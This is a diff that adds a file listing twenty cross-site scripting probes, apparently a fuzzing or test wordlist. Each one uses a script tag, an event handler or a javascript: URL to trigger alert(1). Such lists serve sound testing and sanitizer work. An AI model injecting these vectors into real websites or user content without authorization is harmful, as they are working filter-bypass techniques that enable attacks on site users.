@@ -1,0 +1,20 @@
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<body onload=alert(1)>
+<iframe src="javascript:alert(1)">
+<a href="javascript:alert(1)">click</a>
+<input onfocus=alert(1) autofocus>
+<details open ontoggle=alert(1)>
+<marquee onstart=alert(1)>
+"><script>alert(1)</script>
+' onmouseover=alert(1) '
+<x onclick="alert(1)">click</x>
+<div style="background:url('javascript:alert(1)')">
+<object data="javascript:alert(1)">
+<embed src="data:text/html,<script>alert(1)</script>">
+<form action="javascript:alert(1)"><input type=submit>
+<isindex action="javascript:alert(1)" type=image>
+<xss style="background:url('javascript:alert(1)')">
+<math><brute href="javascript:alert(1)">click</brute></math>
+<video><source onerror="javascript:alert(1)">
